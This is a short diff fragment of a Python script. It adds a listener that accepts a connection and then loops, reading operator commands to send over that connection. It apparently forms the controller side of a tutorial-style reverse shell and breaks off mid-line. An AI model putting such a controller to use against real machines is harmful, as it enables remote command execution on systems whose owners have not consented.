@@ -30,3 +30,18 @@ def bind_socket():
         print("Socket Binding errror: " + str(msg) + "\n" + "Retrying...")
         bind_socket()
 
+# Establishing connection with a client 
+def socket_accept():
+    conn,address = sct.accept()
+    print("Connection has been Established! |" + " IP " + address[0] + " | Port" + str(address[1]))
+    send_command(conn)
+    conn.close()
+
+def send_command(conn):
+    while True:
+        cmd = input()
+        if cmd == 'quit':
+            conn.close()
+            sct.close()
+            sys.exit()
+        if str.encode
